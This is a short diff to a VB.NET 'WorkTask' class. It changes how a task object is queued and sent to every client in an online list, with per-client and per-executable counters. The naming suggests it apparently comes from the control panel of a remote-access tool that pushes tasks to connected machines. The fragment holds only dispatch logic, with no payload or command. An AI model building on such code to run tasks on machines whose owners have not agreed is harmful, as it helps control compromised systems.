@@ -22,21 +22,22 @@ Public Class WorkTask
     Public Async Sub Work(ByVal args As Object())
         While True
             Try
-                Await Task.Delay(5000)
                 If F.InvokeRequired Then
                     F.Invoke(New _Work(AddressOf Work), New Object() {args})
                     Exit Sub
                 Else
+                    Await Task.Delay(10000)
                     For Each L As ListViewItem In F.LV3.Items
                         If L.Tag = TaskID Then
                             isOK = True
 
                             For Each ClientOnServerList In Settings.Online
-                                If Not AllDone.Contains(ClientOnServerList.IP.Split(":")(0)) Then
-                                    ClientOnServerList.BeginSend(Obj)
+                                If Not AllDone.Contains(ClientOnServerList.ID) Then
+                                    Dim ClientReq As New Outcoming_Requests(ClientOnServerList, Obj)
+                                    Pending.Req_Out.Add(ClientReq)
                                     ClientOnServerList.LV.SubItems(F._TASKS.Index).Text += 1
                                     L.SubItems(F._EXE.Index).Text += 1
-                                    AllDone.Add(ClientOnServerList.IP.Split(":")(0))
+                                    AllDone.Add(ClientOnServerList.ID)
                                 End If
                             Next
                         End If
